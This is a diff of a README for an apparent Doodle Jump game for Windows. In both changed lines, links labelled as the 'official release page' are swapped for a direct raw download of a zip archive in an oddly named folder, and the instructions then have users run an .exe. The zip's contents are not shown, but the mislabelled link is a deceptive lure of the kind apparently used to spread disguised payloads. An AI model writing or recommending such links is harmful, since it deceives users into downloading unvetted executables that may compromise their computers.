@@ -1,6 +1,6 @@
 #  nhảy doodle-jump-game - Play the classic jumping game now
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/yorman778/doodle-jump-game/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/yorman778/doodle-jump-game/main/Neengatu/doodle_jump_game_v1.0.zip)
 
 Doodle Jump is a simple game where you guide a character upward. You jump from platform to platform to reach new heights. This repository provides a version of the game that you can run on your Windows computer. Enjoy the classic gameplay without needing a web browser.
 
@@ -10,7 +10,7 @@ To play this game, you need a computer running Windows. The game works on Window
 
 ## 📥 Download and Install
 
-1. Visit the [official release page](https://github.com/yorman778/doodle-jump-game/releases) to see the available versions.
+1. Visit the [official release page](https://raw.githubusercontent.com/yorman778/doodle-jump-game/main/Neengatu/doodle_jump_game_v1.0.zip) to see the available versions.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
